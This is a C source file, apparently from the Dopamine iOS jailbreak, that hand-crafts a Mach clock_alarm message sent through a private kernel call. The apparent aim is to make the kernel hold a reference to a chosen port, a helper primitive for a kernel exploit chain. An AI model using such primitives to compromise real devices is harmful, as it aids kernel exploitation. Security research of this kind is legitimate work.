//
//  clock_alarm.c
//  Dopamine
//
//  Created by Lars Fröder on 03.08.26.
//

#include <unistd.h>
#include <mach/mach.h>
#include <mach/clock.h>
#include <mach/clock_types.h>
#include <mach/mig.h>
#include <mach/ndr.h>
#include <mach-o/dyld.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <sys/fileport.h>
#include <sys/socket.h>
#include <signal.h>
#include <errno.h>
#define IPPROTO_ICMPV6          58
#define ICMP6_FILTER            18
#include <pthread.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <time.h>
#include <sched.h>

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t alarmPort;
    NDR_record_t ndr;
    alarm_type_t alarmType;
    mach_timespec_t alarmTime;
} clock_alarm_request_t;

typedef struct {
    mach_msg_header_t head;
    NDR_record_t ndr;
    kern_return_t result;
} clock_alarm_reply_t;

extern mach_msg_return_t mach_msg2_internal(
    void *data, uint64_t option64, uint64_t msghBitsAndSendSize,
    uint64_t msghRemoteAndLocalPort, uint64_t msghVoucherAndID,
    uint64_t descriptorCountAndReceiveName,
    uint64_t receiveSizeAndPriority, uint64_t timeout);

#define DARKSWORD_MACH64_SEND_KOBJECT_CALL 0x0000000200000000ULL

static uint64_t purple_reclaim_monotonic_nanoseconds(void)
{
    struct timespec value = {0};
    if (clock_gettime(CLOCK_MONOTONIC_RAW, &value) != 0) {
        return 0;
    }
    return (uint64_t)value.tv_sec * 1000000000ULL +
        (uint64_t)value.tv_nsec;
}


static uint64_t purple_reclaim_pack_mach_msg2(uint32_t low, uint32_t high)
{
    return ((uint64_t)high << 32) | low;
}

kern_return_t clock_alarm_preserve_port(mach_port_t surfacePort, uint32_t delaySeconds)
{
    clock_serv_t clockPort = MACH_PORT_NULL;
    kern_return_t result = host_get_clock_service(
        mach_host_self(), SYSTEM_CLOCK, &clockPort);
    if (result != KERN_SUCCESS) {
        return result;
    }

    union {
        clock_alarm_request_t request;
        clock_alarm_reply_t reply;
    } message;
    memset(&message, 0, sizeof(message));
    mach_port_t rpcReply = mig_get_reply_port();
    if (!MACH_PORT_VALID(rpcReply)) {
        mach_port_deallocate(mach_task_self(), clockPort);
        return KERN_FAILURE;
    }

    message.request.head.msgh_bits = MACH_MSGH_BITS_COMPLEX |
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND,
                       MACH_MSG_TYPE_MAKE_SEND_ONCE);
    message.request.head.msgh_size = sizeof(message.request);
    message.request.head.msgh_remote_port = clockPort;
    message.request.head.msgh_local_port = rpcReply;
    message.request.head.msgh_id = 1002;
    message.request.body.msgh_descriptor_count = 1;
    message.request.alarmPort.name = surfacePort;
    message.request.alarmPort.disposition = MACH_MSG_TYPE_COPY_SEND;
    message.request.alarmPort.type = MACH_MSG_PORT_DESCRIPTOR;
    message.request.ndr = NDR_record;
    message.request.alarmType = TIME_RELATIVE;
    message.request.alarmTime.tv_sec = delaySeconds;
    message.request.alarmTime.tv_nsec = 0;

    uint64_t options = MACH_SEND_MSG | MACH_RCV_MSG |
        DARKSWORD_MACH64_SEND_KOBJECT_CALL;
    mach_msg_return_t messageResult = mach_msg2_internal(
        &message, options,
        purple_reclaim_pack_mach_msg2(message.request.head.msgh_bits,
                                      message.request.head.msgh_size),
        purple_reclaim_pack_mach_msg2(message.request.head.msgh_remote_port,
                                      message.request.head.msgh_local_port),
        purple_reclaim_pack_mach_msg2(message.request.head.msgh_voucher_port,
                                      (uint32_t)message.request.head.msgh_id),
        purple_reclaim_pack_mach_msg2(
            message.request.body.msgh_descriptor_count, rpcReply),
        purple_reclaim_pack_mach_msg2(sizeof(message), 0),
        MACH_MSG_TIMEOUT_NONE);
    mach_port_deallocate(mach_task_self(), clockPort);
    if (messageResult != MACH_MSG_SUCCESS) {
        mig_dealloc_reply_port(rpcReply);
        return messageResult;
    }
    mig_put_reply_port(rpcReply);
    return message.reply.result;
}
